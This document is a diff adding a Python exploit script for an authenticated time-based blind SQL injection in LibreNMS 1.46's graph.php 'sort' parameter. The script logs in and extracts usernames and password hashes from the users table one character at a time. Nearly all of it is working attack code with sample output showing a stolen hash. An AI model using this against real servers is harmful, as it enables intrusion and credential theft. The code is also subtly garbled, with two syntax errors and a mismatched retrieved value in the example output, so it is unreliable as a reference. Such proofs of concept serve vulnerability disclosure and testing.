@@ -1,0 +1,263 @@
+# Exploit Title: LibreNMS 1.46 - MAC Accounting Graph Authenticated SQL Injection
+# Google Dork: Unknown
+# Date: 13-12-2020
+# Exploit Author: Hodorsec
+# Vendor Homepage: https://www.librenms.org
+# Software Link: https://github.com/librenms/librenms
+# Update notice: https://community.librenms.org/t/v1-69-october-2020-info/13838
+# Version: 1.46
+# Tested on: Debian 10, PHP 7, LibreNMS 1.46; although newer version might be affected until 1.69 patch
+# CVE : N/A
+
+#!/usr/bin/python3
+
+# EXAMPLE:
+# $ python3 poc_librenms-1.46_auth_sqli_timed.py librenms D32fwefwef http://192.168.252.14 2
+# [*] Checking if authentication for page is required...
+# [*] Visiting page to retrieve initial token and cookies...
+# [*] Retrieving authenticated cookie...
+# [*] Printing number of rows in table...
+# 1
+# [*] Found 1 rows of data in table 'users'
+#
+# [*] Retrieving 1 rows of data using 'username' as column and 'users' as table...
+# [*] Extracting strings from row 1...
+# librenms
+# [*] Retrieved value 'librenKs' for column 'username' in row 1
+# [*] Retrieving 1 rows of data using 'password' as column and 'users' as table...
+# [*] Extracting strings from row 1...
+# $2y$10$pAB/lLNoT8wx6IedB3Hnpu./QMBqN9MsqJUcBy7bsr
+# [*] Retrieved value '$2y$10$pAB/lLNoT8wx6IedB3Hnpu./QMBqN9MsqJUcBy7bsr' for column 'password' in row 1
+#
+# [+] Done!
+
+import requests
+import urllib3
+import os
+import sys
+import re
+from bs4 import BeautifulSoup
+
+# Optionally, use a proxy
+# proxy = "http://<user>:<pass>@<proxy>:<port>"
+proxy = ""
+os.environ['http_proxy'] = proxy
+os.environ['HTTP_PROXY'] = proxy
+os.environ['https_proxy'] = proxy
+os.environ['HTTPS_PROXY'] = proxy
+
+# Disable cert warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Set timeout
+timeout = 10
+
+# Injection prefix and suffix
+inj_prefix = "(select(sleep("
+inj_suffix = ")))))"
+
+# Decimal begin and end
+dec_begin = 48
+dec_end = 57
+
+# ASCII char begin and end
+ascii_begin = 32
+ascii_end = 126
+
+# Handle CTRL-C
+def keyboard_interrupt():
+    """Handles keyboardinterrupt exceptions"""
+    print("\n\n[*] User requested an interrupt, exiting...")
+    exit(0)
+
+# Custom headers
+def http_headers():
+    headers = {
+        'User-Agent': 'Mozilla',
+    }
+    return headers
+
+def check_auth(url,headers):
+    print("[*] Checking if authentication for page is required...")
+    target = url + "/graph.php"
+    r = requests.get(target,headers=headers,timeout=timeout,verify=False)
+    if "Unauthorized" in r.text:
+        return True
+    else:
+        return False
+
+def get_initial_token_and_cookies(url,headers):
+    print("[*] Visiting page to retrieve initial token and cookies...")
+    target = url + "/login"
+    r = requests.get(target,headers=headers,timeout=timeout,verify=False)
+    soup = BeautifulSoup(r.text,'html.parser')
+    for n in soup('input'):
+        if n['name'] == "_token":
+            token = n['value']
+            return token,r.cookies
+        else:
+            return None,r.cookies
+
+def get_valid_cookie(url,headers,token,cookies,usern,passw):
+    print("[*] Retrieving authenticated cookie...")
+    appl_cookie = "laravel_session"
+    post_data = {'_token':token,
+                'username':usern,
+                'password':passw,
+                'submit':''}
+    target = url + "/login"
+    r = requests.post(target,data=post_data,headers=headers,cookies=cookies,timeout=timeout,verify=False)
+    res = r.text
+    if "Overview | LibreNMS" in res:
+        return r.cookies
+    else:
+        print("[!] No valid response from used session, exiting!\n")
+        exit(-1)
+
+# Perform the SQLi call for injection
+def sqli(url,headers,cookies,inj_str,sleep):
+    comment_inj_str = re.sub(" ","/**/",inj_str)
+    inj_params = {'id':'1',
+                'stat':'none',
+                'type':'port_mac_acc_total',
+                'sort':comment_inj_str,
+                'debug':'1'}
+    inj_params_unencoded = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
+    # Do GET request
+    r = requests.get(url,params=inj_params_unencoded,headers=headers,cookies=cookies,timeout=timeout,verify=False)
+    res = r.elapsed.total_seconds()
+    if res >= sleep:
+        return True
+    elif res < sleep:
+        return False
+    else:
+        print("[!] Something went wrong checking responses. Check responses manually. Exiting.")
+        exit(-1)
+
+# Extract rows
+def get_rows(url,headers,cookies,table,sleep):
+    rows = ""
+    max_pos_rows = 4
+    # Get number maximum positional characters of rows: e.g. 1096,2122,1234,etc.
+    for pos in range(1,max_pos_rows+1):
+        # Test if current pos does have any valid value. If not, break
+        direction = ">"
+        inj_str = inj_prefix + str(sleep) + "-(if(ORD(MID((select IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM " + table + ")," + str(pos) + ",1))" + direction + "1,0," + str(sleep) + inj_suffix
+        if not sqli(url,headers,cookies,inj_str,sleep):
+            break
+        # Loop decimals
+        direction = "="
+        for num_rows in range(dec_begin,dec_end+1):
+            row_char = chr(num_rows)
+            inj_str = inj_prefix + str(sleep) + "-(if(ORD(MID((select IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM " + table + ")," + str(pos) + ",1))"=+ direction + str(num_rows) + ",0," + str(sleep) + inj_suffix
+            if sqli(url,headers,cookies,inj_str,sleep):
+                rows += row_char
+                print(row_char,end='',flush=True)
+                break
+    if rows != "":
+        print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
+        return int(rows)
+    else:
+        return False
+
+# Loop through positions and characters
+def get_data(url,headers,cookies,row,column,table,sleep):
+    extracted = ""
+    max_pos_len = 50
+    # Loop through length of string
+    # Not very efficient, should use a guessing algorithm
+    print("[*] Extracting strings from row " + str(row+1) + "...")
+    for pos in range(1,max_pos_len):
+        # Test if current pos does have any valid value. If not, break
+        direction = ">"
+        inj_str = inj_prefix + str(sleep) + "-(if(ord(mid((select ifnull(cast(" + column + " as NCHAR),0x20) from " + table + " LIMIT " + str(row) += ",1)," + str(pos) + ",1))" + direction + str(ascii_begin) + ",0," + str(sleep) + inj_suffix
+        if not sqli(url,headers,cookies,inj_str,sleep):
+            break
+        # Loop through ASCII printable characters
+        direction = "="
+        for guess in range(ascii_begin,ascii_end+1):
+            extracted_char = chr(guess)
+            inj_str = inj_prefix + str(sleep) + "-(if(ord(mid((select ifnull(cast(" + column + " as NCHAR),0x20) from " + table + " LIMIT " + str(row) + ",1)," + str(pos) + ",1))" + direction + str(guess) + ",0," + str(sleep) + inj_suffix
+            if sqli(url,headers,cookies,inj_str,sleep):
+                extracted += chr(guess)
+                print(extracted_char,end='',flush=True)
+                break
+    return extracted
+
+# Main
+def main(argv):
+    if len(sys.argv) == 5:
+        usern = sys.argv[1]
+        passw = sys.argv[2]
+        url = sys.argv[3]
+        sleep = int(sys.argv[4])
+    else:
+        print("[*] Usage: " + sys.argv[0] + " <username> <password> <url> <sleep_in_seconds>\n")
+        exit(0)
+
+    # Random headers
+    headers = http_headers()
+
+    # Do stuff
+    try:
+        # Get a valid initial token and cookies
+        token,cookies = get_initial_token_and_cookies(url,headers)
+        
+        # Check if authentication is required
+        auth_required = check_auth(url,headers)
+
+        if auth_required:
+            # Get an authenticated session cookie using credentials
+            valid_cookies = get_valid_cookie(url,headers,token,cookies,usern,passw)
+        else:
+            valid_cookies = cookies
+            print("[+] Authentication not required, continue without authentication...")
+
+        # Setting the correct vulnerable page
+        url = url + "/graph.php"
+
+        # The columns to retrieve
+        columns = ['username','password']
+
+        # The table to retrieve data from
+        table = "users"
+
+        # Getting rows
+        print("[*] Printing number of rows in table...")
+        rows = get_rows(url,headers,valid_cookies,table,sleep)
+        if not rows:
+            print("[!] Unable to retrieve rows, checks requests.\n")
+            exit(-1)
+
+        # Getting values for found rows in specified columns
+        for column in columns:
+            print("[*] Retrieving " + str(rows) + " rows of data using '" + column + "' as column and '" + table + "' as table...")
+            for row in range(0,rows):
+                # rowval_len = get_length(url,headers,row,column,table)
+                retrieved = get_data(url,headers,valid_cookies,row,column,table,sleep)
+                print("\n[*] Retrieved value '" + retrieved + "' for column'" + column + "' in row " + str(row+1))
+        # Done
+        print("\n[+] Done!\n")
+
+    except requests.exceptions.Timeout:
+        print("[!] Timeout error\n")
+        exit(-1)
+    except requests.exceptions.TooManyRedirects:
+        print("[!] Too many redirects\n")
+        exit(-1)
+    except requests.exceptions.ConnectionError:
+        print("[!] Not able to connect to URL\n")
+        exit(-1)
+    except requests.exceptions.RequestException as e:
+        print("[!] " + str(e))
+        exit(-1)
+    except requests.exceptions.HTTPError as e:
+        print("[!] Failed with error code - " + str(e.code) + "\n")
+        exit(-1)
+    except KeyboardInterrupt:
+        keyboard_interrupt()
+        exit(-1)
+
+# If we were called as a program, go execute the main function.
+if __name__ == "__main__":
+    main(sys.argv[1:])
